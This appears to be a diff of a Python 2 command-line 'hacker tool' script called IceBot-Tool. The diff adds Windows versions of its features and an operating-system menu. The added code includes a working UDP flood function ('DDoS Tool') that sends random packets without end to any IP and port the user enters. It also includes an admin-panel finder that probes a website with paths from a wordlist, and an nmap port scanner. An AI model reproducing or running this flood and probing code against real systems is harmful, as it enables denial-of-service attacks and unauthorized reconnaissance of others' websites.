@@ -16,12 +16,19 @@ def PortScanner():
     print ga.blue
     os.system("clear")
     os.system("figlet Port Scanner")
+    IP = raw_input("WebSite To Scan: ")
+    command = "nmap "+ IP
+    process = os.popen(command)
+    info = str(process.read())
+    print info
+
+def PortScannerWIN():
+    os.system("cls")
+    os.system("color 1")
     server = raw_input("Server To Scan: ")
     serverip = socket.gethostbyname(server)
-############################################
-    os.system("clear")
-    os.system("figlet SCANNING...")
-############################################
+    os.system("cls")
+    
     print "----------------------------------+"
     print "Scanning Host: ",  serverip, "   +"
     print "----------------------------------+"
@@ -50,6 +57,27 @@ def findAdmin():
 	print ga.yellow
         os.system("clear")
         os.system("figlet Admin Panel Finder")
+	f = open("link.txt","r");
+	link = raw_input("Enter WebSite Name: ")
+	print "\n\nAvilable links : \n"
+	while True:
+		sub_link = f.readline()
+		if not sub_link:
+			break
+		req_link = "http://"+link+"/"+sub_link
+		req = Request(req_link)
+		try:
+			response = urlopen(req)
+		except HTTPError as e:
+			continue
+		except URLError as e:
+			continue
+		else:
+			print "OK => ",req_link
+
+def findAdminWIN():
+        os.system("cls")
+        os.system("color 9")
 	f = open("link.txt","r");
 	link = raw_input("Enter WebSite Name: ")
 	print "\n\nAvilable links : \n"
@@ -115,6 +143,26 @@ def DDoS():
     except KeyboardInterrupt:
         print "exiting"
 
+def DDoSWIN():
+    os.system("cls")
+    os.system("color 4")
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(2048)
+    ip = raw_input("Target IP : ")
+    port = input("Target Port : ")
+    ##############################
+    os.system("clear")
+    sent = 0
+    try:
+        while True:
+            sock.sendto(bytes, (ip,port))
+            sent = sent + 1
+
+            print "Sent: %s packet to: %s throught port:%s"%(sent,ip,port)
+    except KeyboardInterrupt:
+        print "exiting"
+
+
 #################
 def Update():
     print ga.rose
@@ -143,6 +191,13 @@ def webSiteInfo():
         process = os.popen(command)
         info = str(process.read())
         print info
+
+def ip():
+    os.system("cls")
+    os.system("color 6")
+    server = raw_input("WebSite: ")
+    ip = socket.gethostbyname(server)
+    print server, "----->", ip
 
 def networkScanner():
     print ga.yellow
@@ -176,46 +231,87 @@ def networkScanner():
 
 
 #################
-print ga.red
-os.system("clear")
-print "#####################################"
-print "#    ++++++ IceBot-Tool v1 ++++++   #"
-print "#        |==================|       #"
-print "#    +   |MACEDONIA IS GREEK|  +    #"
-print "#        |==================|       #"
-print "#    +    Scripts by icebot    +    #"
-print "#   +++    WHITE-HAT-HACKER   +++   #"
-print "#####################################"
-os.system("figlet iceBot-Tool")
-print ga.green
-print "[1]  Port Scanner"
-print "[2]  Admin Panel Finder"
-print "[3]  DDoS Tool"
-print "[4]  Linux Update"
-print "[5]  Termux Update"
-print "[6]  Find Website Info"
-print "[7]  NetWork Scan"
-print "\n" 
 
-tool = input("----> ")
+print "[1] for linux"
+print "[2] for windows"
+print "[3] for termux"
+print "\n"
+soft = input("Software: ")
+if soft == 1:
+    print ga.red
+    os.system("clear")
+    print "#####################################"
+    print "#    ++++++ IceBot-Tool v1 ++++++   #"
+    print "#        |==================|       #"
+    print "#    +   |MACEDONIA IS GREEK|  +    #"
+    print "#        |==================|       #"
+    print "#    +    Scripts by icebot    +    #"
+    print "#   +++    WHITE-HAT-HACKER   +++   #"
+    print "#####################################"
+    os.system("figlet iceBot-Tool")
+    os.system("color 1")
+    print "[1]  WebSite Port Scanner"
+    print "[2]  Admin Panel Finder"
+    print "[3]  DDoS Tool"
+    print "[4]  NetWork Scan"
+    print "[5]  Find WebSite Info"
+    print "[6]  Termux update"
+    print "[7]  Linux Update"
+    print "\n" 
 
-if tool == 1:
-    PortScanner()
+    tool = input("----> ")
 
-elif tool == 2:
-    findAdmin()
+    if tool == 1:
+        PortScanner()
 
-elif tool == 3:
-    DDoS()
+    elif tool == 2:
+        findAdmin()
+
+    elif tool == 3:
+        DDoS()
    
-elif tool == 4:
-    Update()
+    elif tool == 4:
+        Update()
     
-elif tool == 5:
-    termux()    
+    elif tool == 5:
+        termux()    
 
-elif tool == 6:
-    webSiteInfo()
+    elif tool == 6:
+        webSiteInfo()
 
-elif tool == 7:
-    networkScanner()
+    elif tool == 7:
+        networkScanner()
+
+elif soft == 2:
+    os.system("cls")
+    os.system("color 4")
+    print "#####################################"
+    print "#    ++++++ IceBot-Tool v1 ++++++   #"
+    print "#        |==================|       #"
+    print "#    +   |MACEDONIA IS GREEK|  +    #"
+    print "#        |==================|       #"
+    print "#    +    Scripts by icebot    +    #"
+    print "#   +++    WHITE-HAT-HACKER   +++   #"
+    print "#####################################"
+    os.system("color 2")
+    print "[1]  Port Scanner"
+    print "[2]  Admin Panel Finder"
+    print "[3]  DDoS Tool"
+    print "[4]  Find Websites IP"
+    print "\n" 
+
+    tool = input("----> ")
+
+    if tool == 1:
+        PortScannerWIN()
+
+    elif tool == 2:
+        findAdminWIN()
+
+    elif tool == 3:
+        DDoSWIN()  
+
+    elif tool == 4:
+        ip()
+
+
